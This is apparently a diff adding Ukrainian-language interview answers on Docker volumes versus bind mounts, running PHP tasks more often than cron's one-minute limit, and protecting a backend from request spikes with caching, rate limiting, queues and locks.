+Docker надає три способи зберігання даних поза контейнером: **volumes**, **bind mounts** і **tmpfs**. Volumes і bind mounts вирішують одну задачу — зберігати дані так, щоб вони не зникали при перезапуску контейнера — але роблять це по-різному. Volume — це абстракція Docker, яка керується Docker Engine. Bind mount — це пряме монтування директорії з хостової машини всередину контейнера.
+
+---
+
+#### Docker Volume
+
+Volume — керований Docker об'єкт. Docker сам вирішує де зберігати дані (зазвичай `/var/lib/docker/volumes/`). Застосунок у контейнері не знає де фізично лежать дані.
+
+```bash
+# Створити volume
+docker volume create mydata
+
+# Запустити контейнер з volume
+docker run -v mydata:/var/lib/mysql mysql:8
+
+# Або через --mount (явніший синтаксис)
+docker run --mount type=volume,source=mydata,target=/var/lib/mysql mysql:8
+
+# Подивитись всі volumes
+docker volume ls
+
+# Деталі volume
+docker volume inspect mydata
+
+# Видалити
+docker volume rm mydata
+
+# Видалити всі невикористовувані
+docker volume prune
+```
+
+**Docker Compose:**
+```yaml
+services:
+  db:
+    image: mysql:8
+    volumes:
+      - db_data:/var/lib/mysql
+
+volumes:
+  db_data:
+```
+
+---
+
+#### Bind Mount
+
+Bind mount — монтує конкретну директорію або файл з хосту прямо в контейнер. Контейнер бачить і змінює файли хосту в реальному часі.
+
+```bash
+# Синтаксис -v
+docker run -v /home/user/app:/var/www/html nginx
+
+# Або --mount
+docker run --mount type=bind,source=/home/user/app,target=/var/www/html nginx
+
+# Відносний шлях у Compose ($ pwd для поточної директорії)
+```
+
+**Docker Compose:**
+```yaml
+services:
+  app:
+    image: php:8.2-fpm
+    volumes:
+      - ./src:/var/www/html        # bind mount
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro  # read-only
+```
+
+---
+
+#### Ключові відмінності
+
+| | Volume | Bind Mount |
+|---|---|---|
+| Керування | Docker Engine | Розробник (шлях на хості) |
+| Розташування | `/var/lib/docker/volumes/` | Будь-який шлях на хості |
+| Портативність | Висока (не залежить від структури хосту) | Низька (залежить від шляху на хості) |
+| Продуктивність | Краща (особливо на Mac/Windows) | Повільніша на Mac/Windows через файлову синхронізацію |
+| Backup / migrate | `docker volume` команди | Звичайні файлові операції |
+| Спільне використання | Між кількома контейнерами легко | Можливо, але потребує узгодження шляхів |
+| Перегляд вмісту | Через `docker run` або `docker cp` | Напряму з хосту |
+
+---
+
+#### Продуктивність на Mac і Windows
+
+На Linux bind mount і volume мають порівнянну швидкість. На **Mac і Windows** Docker Desktop запускає Linux VM, і bind mount потребує синхронізації файлів між хостом і VM — це може бути суттєво повільнішим для великих кодових баз.
+
+Для production на Linux різниця незначна.
+
+---
+
+#### Коли використовувати Volume
+
+**Бази даних і persistent storage:**
+```yaml
+services:
+  postgres:
+    image: postgres:16
+    volumes:
+      - pg_data:/var/lib/postgresql/data
+
+volumes:
+  pg_data:
+```
+Дані БД не повинні залежати від структури файлової системи хосту і мають зберігатись між перезапусками і оновленнями образу.
+
+**Shared storage між контейнерами:**
+```yaml
+services:
+  app:
+    volumes:
+      - uploads:/var/www/uploads
+  worker:
+    volumes:
+      - uploads:/var/www/uploads
+
+volumes:
+  uploads:
+```
+
+**Production середовище:** volumes портативні, легше переносити між хостами, краще підходять для CI/CD і оркестрації.
+
+---
+
+#### Коли використовувати Bind Mount
+
+**Локальна розробка — hot reload коду:**
+```yaml
+services:
+  app:
+    image: php:8.2-fpm
+    volumes:
+      - .:/var/www/html   # зміни в коді одразу видно в контейнері
+```
+
+**Конфіг файли:**
+```yaml
+services:
+  nginx:
+    volumes:
+      - ./docker/nginx/default.conf:/etc/nginx/conf.d/default.conf:ro
+```
+
+**Читання логів з хосту:**
+```yaml
+volumes:
+  - ./logs:/var/log/app
+```
+
+**Коли потрібен прямий доступ до файлів з хосту** — IDE, git, інструменти розробки.
+
+---
+
+#### tmpfs mount
+
+Третій варіант — зберігання тільки в пам'яті, не на диску. Дані зникають при зупинці контейнера.
+
+```bash
+docker run --mount type=tmpfs,target=/tmp myapp
+```
+
+Корисно для тимчасових файлів, кешу, що не потрібно зберігати, або чутливих даних що не повинні потрапляти на диск.
+
+---
+
+#### Типова схема для PHP-проекту
+
+```yaml
+services:
+  app:
+    build: .
+    volumes:
+      - .:/var/www/html          # bind: код для розробки
+      - vendor:/var/www/vendor   # volume: composer deps (не синхронізувати з хостом)
+
+  db:
+    image: mysql:8
+    volumes:
+      - db_data:/var/lib/mysql   # volume: persistent дані
+
+  redis:
+    image: redis:7
+    volumes:
+      - redis_data:/data         # volume: persistent кеш
+
+volumes:
+  db_data:
+  redis_data:
+  vendor:
+```
+
+---
+
+#### Міні-шпаргалка
+
+- **Volume** — керується Docker, портативний, для persistent даних (БД, uploads)
+- **Bind mount** — шлях з хосту, для розробки (код, конфіги, логи)
+- **tmpfs** — тільки в пам'яті, для тимчасових або чутливих даних
+- **Production** → volumes; **Local dev** → bind mounts для коду
+- На Mac/Windows bind mount повільніший через файлову синхронізацію
+
+</details>
+
+---
+
+<a id="24"></a>
+
+### 24. Як реалізувати виконання задачі частіше, ніж раз на хвилину, якщо стандартний cron має обмеження в 1 хвилину? Які є альтернативні підходи в production-середовищі?
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+Стандартний cron має мінімальний інтервал — 1 хвилина. Якщо потрібно запускати задачу кожні 10, 15 або 30 секунд — є кілька підходів: sleep-loop всередині cron-скрипта, supervisor із постійно запущеним процесом, черги повідомлень (RabbitMQ, Redis, SQS) або спеціалізовані планувальники. Вибір залежить від характеру задачі, допустимої затримки і складності інфраструктури.
+
+---
+
+#### Підхід 1 — Sleep loop у cron (найпростіший)
+
+Cron запускає скрипт раз на хвилину, а скрипт сам крутиться у циклі:
+
+```php
+// run_every_10s.php
+$iterations = 6;          // 6 разів × 10 сек = 60 сек
+$interval   = 10;         // секунд між запусками
+
+for ($i = 0; $i < $iterations; $i++) {
+    $start = microtime(true);
+
+    doWork(); // основна логіка
+
+    $elapsed = microtime(true) - $start;
+    $sleep   = max(0, $interval - $elapsed);
+
+    if ($i < $iterations - 1) {
+        sleep((int) $sleep);
+        // або usleep для мікросекунд
+    }
+}
+```
+
+```
+# Crontab — запускає скрипт раз на хвилину
+* * * * * php /var/www/run_every_10s.php
+```
+
+**Плюси:** просто, не потрібна додаткова інфраструктура.
+
+**Мінуси:** якщо `doWork()` займе більше `$interval` — наступна ітерація зміститься. Немає захисту від паралельного запуску якщо попередній ще не завершився.
+
+---
+
+#### Підхід 2 — Supervisor + нескінченний цикл (надійніший)
+
+Supervisor (або systemd) тримає процес живим і перезапускає при падінні:
+
+```php
+// worker.php — нескінченний daemon
+declare(ticks=1);
+
+while (true) {
+    $start = microtime(true);
+
+    try {
+        doWork();
+    } catch (\Throwable $e) {
+        logger()->error($e->getMessage());
+    }
+
+    $elapsed = microtime(true) - $start;
+    $sleep   = max(0, 10 - $elapsed); // кожні 10 секунд
+    usleep((int)($sleep * 1_000_000));
+}
+```
+
+```ini
+; /etc/supervisor/conf.d/worker.conf
+[program:my-worker]
+command=php /var/www/worker.php
+autostart=true
+autorestart=true
+stderr_logfile=/var/log/worker.err.log
+stdout_logfile=/var/log/worker.out.log
+user=www-data
+```
+
+```bash
+supervisorctl reread
+supervisorctl update
+supervisorctl start my-worker
+supervisorctl status
+```
+
+**Плюси:** процес завжди живий, автоматичний рестарт, логування через supervisor.
+
+**Мінуси:** треба стежити за memory leaks у довго-живучих PHP процесах.
+
+---
+
+#### Підхід 3 — Черги повідомлень (правильна архітектура)
+
+Якщо задача — обробка подій або повідомлень, правильне рішення — черга. Producer кладе повідомлення, consumer обробляє одразу як вони надходять — без фіксованих інтервалів.
+
+```
+Producer → RabbitMQ / Redis Streams / SQS → Consumer Worker
+```
+
+```bash
+# Symfony Messenger — worker читає з черги безперервно
+php bin/console messenger:consume async --limit=100 --time-limit=3600
+```
+
+```ini
+; Supervisor запускає кілька workers паралельно
+[program:messenger-worker]
+command=php /var/www/bin/console messenger:consume async
+numprocs=4
+autostart=true
+autorestart=true
+```
+
+**Плюси:** реально event-driven, масштабується горизонтально, немає polling.
+
+**Мінуси:** потрібна інфраструктура (RabbitMQ, Redis).
+
+---
+
+#### Підхід 4 — Symfony Scheduler (з PHP 6.3 / Symfony 6.3+)
+
+Symfony має вбудований планувальник через Messenger:
+
+```php
+// src/Scheduler/MainSchedule.php
+use Symfony\Component\Scheduler\Attribute\AsSchedule;
+use Symfony\Component\Scheduler\RecurringMessage;
+use Symfony\Component\Scheduler\Schedule;
+use Symfony\Component\Scheduler\ScheduleProviderInterface;
+
+#[AsSchedule]
+class MainSchedule implements ScheduleProviderInterface
+{
+    public function getSchedule(): Schedule
+    {
+        return (new Schedule())
+            ->add(RecurringMessage::every('10 seconds', new SyncDataMessage()))
+            ->add(RecurringMessage::cron('* * * * *', new HourlyReportMessage()));
+    }
+}
+```
+
+```bash
+# Worker для планувальника
+php bin/console messenger:consume scheduler_default
+```
+
+**Плюси:** рідний Symfony підхід, не потрібен зовнішній cron, підтримує будь-які інтервали.
+
+---
+
+#### Підхід 5 — Кілька cron записів зі зсувом (для хвилинних задач)
+
+Якщо потрібно кожні 30 секунд — два cron з `sleep 30`:
+
+```
+* * * * * php /var/www/task.php
+* * * * * sleep 30 && php /var/www/task.php
+```
+
+Грубо, але працює без додаткової інфраструктури.
+
+---
+
+#### Захист від паралельного запуску (важливо для будь-якого підходу)
+
+```php
+// Варіант 1 — file lock
+$lockFile = '/tmp/my_task.lock';
+$fp = fopen($lockFile, 'w');
+
+if (!flock($fp, LOCK_EX | LOCK_NB)) {
+    exit(0); // вже виконується
+}
+
+doWork();
+
+flock($fp, LOCK_UN);
+fclose($fp);
+```
+
+```php
+// Варіант 2 — Symfony Lock Component
+use Symfony\Component\Lock\LockFactory;
+use Symfony\Component\Lock\Store\FlockStore;
+
+$factory = new LockFactory(new FlockStore('/tmp'));
+$lock    = $factory->createLock('my-task', ttl: 60);
+
+if (!$lock->acquire()) {
+    return; // вже виконується
+}
+
+try {
+    doWork();
+} finally {
+    $lock->release();
+}
+```
+
+---
+
+#### Порівняння підходів
+
+| Підхід | Мін. інтервал | Складність | Підходить для |
+|--------|-------------|------------|---------------|
+| Sleep loop у cron | ~1 сек | Низька | Прості задачі |
+| Supervisor daemon | ~0 | Середня | Polling, синхронізація |
+| Черга (RabbitMQ/Redis) | Миттєво | Висока | Event-driven задачі |
+| Symfony Scheduler | ~1 сек | Середня | Symfony проекти |
+| Кілька cron + sleep | 30 сек | Низька | Швидкий workaround |
+
+---
+
+#### Міні-шпаргалка
+
+- **Cron мінімум** — 1 хвилина; для частіших задач потрібні workarounds
+- **Sleep loop** — найпростіше, cron раз на хвилину, скрипт крутиться сам
+- **Supervisor daemon** — надійніше, процес завжди живий
+- **Черга** — правильна архітектура для event-driven задач
+- **Symfony Scheduler** — нативне рішення для Symfony 6.3+
+- **Завжди** використовувати lock для захисту від паралельного запуску
+
+</details>
+
+---
+
+<a id="25"></a>
+
+### 25. Як би ви проектували систему для обробки різкого напливу однотипних запитів, щоб зменшити навантаження на бекенд і базу даних? Розкажіть про кешування, rate limiting, черги, дедуплікацію, блокування, cache stampede та масштабування.
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+Різкий наплив однотипних запитів — класична задача масштабування. Відповідь будується пошарово: перший шар відсікає зайві запити (rate limiting, кеш), другий вирівнює навантаження (черги), третій захищає від патологічних сценаріїв (cache stampede, lock). Немає єдиного рішення — правильний підхід залежить від характеру даних: чи можна їх кешувати, наскільки важлива актуальність, чи ідентичні запити від різних користувачів.
+
+---
+
+#### Шар 1 — Кешування (перша лінія захисту)
+
+Якщо відповідь однакова для багатьох запитів — кешуємо і не ходимо в БД взагалі.
+
+```php
+// Redis-кеш з TTL
+$cacheKey = 'product:' . $productId;
+$product  = $redis->get($cacheKey);
+
+if ($product === null) {
+    $product = $db->findProduct($productId); // тільки при cache miss
+    $redis->setex($cacheKey, 300, serialize($product)); // TTL 5 хвилин
+}
+
+return unserialize($product);
+```
+
+**Рівні кешування:**
+- **CDN / Nginx** — статичний контент, публічні сторінки
+- **Application cache** (Redis, Memcached) — результати запитів, агреговані дані
+- **HTTP cache headers** — `Cache-Control: max-age` для браузера і проміжних проксі
+- **Мемоізація** — повторні виклики в межах одного запиту
+
+**Коли кешувати не можна:** персональні дані, real-time залишки товарів, фінансові баланси.
+
+---
+
+#### Шар 2 — Rate Limiting (захист від перевантаження)
+
+Обмежує кількість запитів від одного клієнта або загалом.
+
+**Алгоритми:**
+- **Fixed Window** — ліміт за фіксований проміжок (100 req/хв). Проблема: burst на межі вікон.
+- **Sliding Window** — плаваюче вікно, рівномірніше. Дорожче по пам'яті.
+- **Token Bucket** — є відро з токенами, кожен запит бере токен. Дозволяє burst до розміру відра.
+- **Leaky Bucket** — запити обробляються з постійною швидкістю, решта в черзі.
+
+```php
+// Redis + Sliding Window
+function isRateLimited(string $key, int $limit, int $windowSec): bool
+{
+    $now    = microtime(true);
+    $window = $now - $windowSec;
+
+    $redis->zremrangebyscore($key, '-inf', $window);   // видалити старі
+    $count = $redis->zcard($key);
+
+    if ($count >= $limit) {
+        return true; // заблоковано
+    }
+
+    $redis->zadd($key, $now, $now);
+    $redis->expire($key, $windowSec);
+    return false;
+}
+```
+
+```nginx
+# Nginx rate limiting
+limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
+
+location /api/ {
+    limit_req zone=api burst=20 nodelay;
+    # burst=20 — дозволяє сплеск до 20 запитів
+}
+```
+
+---
+
+#### Шар 3 — Дедуплікація однакових запитів
+
+Якщо 1000 користувачів одночасно запитують один і той самий ресурс — виконуємо запит один раз, решта чекають.
+
+```php
+// Request coalescing / single-flight pattern
+function getWithCoalescing(string $key, callable $loader): mixed
+{
+    // Перевірити кеш
+    $cached = $redis->get($key);
+    if ($cached !== null) return unserialize($cached);
+
+    // Спробувати взяти lock
+    $lockKey = 'lock:' . $key;
+    $locked  = $redis->set($lockKey, 1, ['NX', 'EX' => 10]); // NX = тільки якщо не існує
+
+    if ($locked) {
+        // Я перший — виконую запит
+        try {
+            $data = $loader();
+            $redis->setex($key, 300, serialize($data));
+            return $data;
+        } finally {
+            $redis->del($lockKey);
+        }
+    }
+
+    // Хтось вже виконує — чекаю і беру з кешу
+    $attempts = 0;
+    while ($attempts++ < 10) {
+        usleep(100_000); // 100ms
+        $cached = $redis->get($key);
+        if ($cached !== null) return unserialize($cached);
+    }
+
+    // Якщо так і не з'явилось — виконую сам
+    return $loader();
+}
+```
+
+---
+
+#### Шар 4 — Cache Stampede (thundering herd)
+
+**Проблема:** кеш протух у 23:59, тисячі запитів одночасно йдуть у БД — БД падає.
+
+**Рішення 1 — Probabilistic Early Expiration (PER):**
+```php
+// Починаємо оновлювати кеш трохи раніше закінчення TTL
+// замість того щоб чекати поки всі прийдуть після закінчення
+function getWithPER(string $key, int $ttl, callable $loader): mixed
+{
+    $cached = $redis->get($key);
+    if ($cached !== null) {
+        ['data' => $data, 'expires_at' => $expiresAt] = unserialize($cached);
+        $beta = 1.0;
+        // Якщо до закінчення залишилось мало часу — з певною ймовірністю оновлюємо
+        if ($expiresAt - $beta * log(random_int(1, PHP_INT_MAX) / PHP_INT_MAX) >= time()) {
+            return $data;
+        }
+    }
+
+    $data = $loader();
+    $redis->setex($key, $ttl, serialize(['data' => $data, 'expires_at' => time() + $ttl]));
+    return $data;
+}
+```
+
+**Рішення 2 — Background refresh:**
+Кеш повертає стару версію (`stale`), а в фоні запускає оновлення.
+
+```php
+if ($cacheExpiresSoon) {
+    // Повернути старе значення
+    $result = $staleValue;
+    // Оновити в фоні (через чергу або async)
+    $queue->dispatch(new RefreshCacheJob($key));
+} else {
+    $result = $freshValue;
+}
+```
+
+**Рішення 3 — Lock + stale value:**
+```php
+$value = $redis->get($key);
+
+if ($isStale($value)) {
+    $lock = $redis->set('lock:' . $key, 1, ['NX', 'EX' => 10]);
+    if ($lock) {
+        $value = $loader(); // тільки один процес оновлює
+        $redis->setex($key, $ttl, $value);
+    }
+    // інші повертають stale value поки lock активний
+}
+return $value;
+```
+
+---
+
+#### Шар 5 — Черги (queue-based load leveling)
+
+Замість синхронної обробки — кидати в чергу і обробляти з контрольованою швидкістю.
+
+```
+1000 HTTP запитів/сек
+       ↓
+   RabbitMQ / Redis Queue
+       ↓
+   5 workers обробляють по 50 req/сек
+```
+
+```php
+// Producer (HTTP handler) — швидко
+public function createOrder(Request $request): Response
+{
+    $this->bus->dispatch(new ProcessOrderMessage($request->toArray()));
+    return new Response('Accepted', 202); // не чекаємо результату
+}
+
+// Consumer (worker) — контрольована швидкість
+class ProcessOrderHandler implements MessageHandlerInterface
+{
+    public function __invoke(ProcessOrderMessage $message): void
+    {
+        // повільна обробка — БД, зовнішні API
+        $this->orderService->process($message->getData());
+    }
+}
+```
+
+**Коли підходить:** для задач де користувач не чекає синхронної відповіді (відправка email, обробка файлів, генерація звітів).
+
+---
+
+#### Шар 6 — Горизонтальне масштабування
+
+```
+Internet → Load Balancer (Nginx/HAProxy)
+               ↓         ↓         ↓
+           App #1    App #2    App #3
+               ↓         ↓         ↓
+           Redis Cluster (shared cache, sessions)
+               ↓
+           DB Primary + Read Replicas
+```
+
+**Read replicas** — читання йде на репліки, записи — на primary. Розвантажує основну БД.
+
+**Stateless application** — будь-який instance обробляє будь-який запит. Сесії в Redis, файли в S3.
+
+---
+
+#### Загальна схема захисту від spike
+
+```
+Request
+  → CDN / HTTP Cache (публічний контент)
+  → Rate Limiter (відсікти зловживання)
+  → Application Cache (Redis/Memcached)
+      → Cache hit: відповідь без БД
+      → Cache miss + lock: один запит у БД, решта чекають
+  → Queue (для async задач)
+  → DB (Read Replica для читання)
+```
+
+---
+
+#### Міні-шпаргалка
+
+- **Кешування** — перша лінія; Redis з TTL; не кешувати персональні/real-time дані
+- **Rate Limiting** — Token Bucket або Sliding Window; Nginx `limit_req`
+- **Дедуплікація** — lock у Redis, single-flight: один запит у БД, решта чекають
+- **Cache Stampede** — lock + stale value, або probabilistic early expiration
+- **Черги** — для async задач; HTTP відповідає 202, worker обробляє пізніше
+- **Масштабування** — stateless app, read replicas, shared Redis
 
 </details>
